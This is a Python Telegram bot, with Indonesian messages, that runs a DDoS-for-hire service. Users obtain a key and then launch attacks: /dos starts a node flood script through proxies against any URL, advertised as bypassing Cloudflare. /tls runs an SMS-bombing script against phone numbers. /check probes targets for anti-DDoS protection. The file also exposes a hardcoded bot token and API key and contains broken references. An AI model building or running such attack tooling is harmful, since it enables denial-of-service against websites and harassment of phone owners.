import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
R = '\033[31m'

bot_token = '7123684153:AAEEjAUrTpgb-Vya0ENfiQ4BpflITVuRNXI' 
bot = telebot.TeleBot(bot_token)

allowed_users = []
processes = []
ADMIN_ID = 519408903
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
print(R + "> Bot Running...\n")
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Admin Name For')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Masukkan Format yang Benar \ntambahkan + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Pengguna Ditambahkan Dengan ID Adalah: {user_id} Menggunakan Perintah 30 Hari')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=65a2e46e9039602cc6706844&url=https://pastebin.com/raw/CVnVfmMe')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Kesalahan key Silakan Gunakan Perintah Lagi /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "Kesalahan key Silakan Gunakan Perintah Lagi /getkey"
    
    text = f'''
━➤ GET KEY KESUKSESAN
━➤ Link Dapatkan Kunci Hari Ini: {url_key}
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Silakan Masukkan Kunci\nContoh : /key xxxxxxx')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Key Sukses\nAnda Berwenang untuk Menggunakan Semua Perintah Gratis')
    else:
        bot.reply_to(message, 'Masukkan Kunci Berhasil\nJangan Gunakan Kunci Orang Lain!')
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
┏━━━━━━━━━━━━━━┓
┃  GET KEY AKSES
┗━━━━━━━━━━━━━━➤
- /getkey : Untuk Mendapatkan Key Gratis\n\n
- /key <key baru> : Masukan Key\n\n

┏━━━━━━━━━━━━━━┓
┃  DDOS GRATIS
┗━━━━━━━━━━━━━━➤

- DDOS BYPASS CLOUDFIRE
###########################
- PENGUNAAN : /dos <url> \n Contoh : /dos https://google.com\n
┏━━━━━━━━━━━━━━┓
┃  Perintah yang Berguna
┗━━━━━━━━━━━━━━➤
- /check <link website> : Periksa fitur anti-ddos di situs web ( Tidak 100% akurat )\n\n
- /code <link website> : Untuk mendapatkan kode html situs web\n\n
- /proxy : Periksa nomor proxy yang digunakan bot\n\n
- /time : Lihat Berapa Lama BOT Aktif\n\n
- /admin : Daftar jejaring sosial Admin
'''
    bot.reply_to(message, help_text)
@bot.message_handler(commands=['tmute'])
def tmute(message):
    pass
@bot.message_handler(commands=['muakey'])
def muakey(message):
    pass
@bot.message_handler(commands=['nhapkey'])
def nhapkeyvip(message):
    pass
@bot.message_handler(commands=['vip'])
def vipsms(message):
    pass
@bot.message_handler(commands=['ddos'])
def didotv(message):
    pass
@bot.message_handler(commands=['setflood'])
def aygspws(message):
    pass
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
--- LAYER 7 ---
CF-BYPASS
HTTP-LOAD
FLOOD
--- LAYER 4 ---
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Perintah Serangan Dihentikan, Terima Kasih Telah Menggunakan")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['dos'])
def ddos_command(message):
    user_id = message.from_user.id
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot saat ini dinonaktifkan. Harap tunggu sampai dihidupkan kembali.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Silakan masuk Key\nGunakan perintah /getkey mendapatkan kembali Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Silakan masukkan sintaks yang benar.\nPenggunaan : /dos <link website>')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Harap tunggu {remaining_time} detik sebelum menggunakan perintah itu lagi /attack.")
        return
    
    host = message.text.split()[1]
    command = ["node", "TLSCLF.js", host, "90", "64", "2", "proxy.txt"]
    duration = 90

    cooldown_dict[username] = {'attack': current_time}

    attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
    attack_thread.start()
    bot.reply_to(message,f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : @Ro0TN3T\n  ➤ Di Serang oleh » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 90s «\n  ➤ Methods » TLS FREE «\n  ➤ Cooldown » 120s «\n  ➤ Plan » Free «\n')


@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f" Proxy Aktif : {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Tidak ditemukan file proxy.txt.")
    else:
        bot.reply_to(message, 'Silakan masukan Key\nDapatkan key baru /getkey')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f" proxy update : {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Anda tidak memiliki izin untuk menggunakan perintah ini.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Anda tidak memiliki izin untuk menggunakan perintah ini')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot telah dimatikan. Semua pengguna tidak dapat menggunakan perintah lain.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Anda tidak memiliki izin untuk menggunakan perintah ini.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot telah dimulai ulang. Semua pengguna dapat menggunakan kembali perintah secara normal.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot saat ini dinonaktifkan. Harap tunggu sampai dihidupkan kembali')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='key expired\ndapatkan key baru /getkey')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Silakan masukkan sintaks yang benar.\nMisalnya: /code + [link situs web]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Kode sumber tidak dapat diperoleh dari situs ini. Silakan periksa kembali URL-nya.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Situs web ini bukan HTML atau PHP. Silakan coba dengan URL website yang berisi file HTML atau PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Terjadi kesalahan: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Silakan masukkan sintaks yang benar.\nPengunaan : /check + [link website]')
        return

    url = message.text.split()[1]
    
    
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Host : {url}\nIp : {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Kemungkinan Tidak Ada Antiddos"
        else:
            reply += "Kemungkinan Antiddos Sangat Tinggi"

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Terjadi kesalahan : {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/Ro0T_N3T")


start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot saat ini dinonaktifkan. Harap tunggu sampai dihidupkan kembali.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Silakan masukkan key\nGunakan perintah /getkey untuk mendapatkan key')
        return

    try:
        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Menit Tu Update\nKuantitas proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Tidak ditemukan file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'Pada Jam : {hours} Menit : {minutes} Detik : {seconds}'
    bot.reply_to(message, f'Bot Berfungsi Sekarang : {uptime_str}')

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_sms(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 180:
                cmd_process.terminate()
                bot.reply_to(message, "Perintah Serangan Dihentikan, Terima Kasih Telah Menggunakan")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return


@bot.message_handler(commands=['tls'])
def attack_command(message):
    user_id = message.from_user.id
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot saat ini dinonaktifkan. Harap tunggu sampai dihidupkan kembali.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Silakan masukkan key\nGunakan perintah /getkey untuk mendapatkan key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Silakan masukkan sintaks yang benar.\nPenggunaan: /tls <nomor tujuan>')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0393366620']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Anda tidak dapat mengirim tls ke nomor ini')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Harap Tunggu {remaining_time} detik sebelum melanjutkan menggunakan perintah ini.')
        return
    
    cooldown_dict[user_id] = time.time()

    # Define the attack command and duration here
    command = ["node", "tls.js", phone_number, "180"]
    duration = 180

    attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
    attack_thread.start()
    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Attack TLS BERHASIL!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {host} \n┣➤ Time: {duration} Detik\n┣➤ Plan: Free \n┣➤ Admin: Ro0TN3T\n┗━━━━━━━━━━━━━━➤')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Pesanan tidak valid. Silakan gunakan perintah /help untuk melihat daftar perintah.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
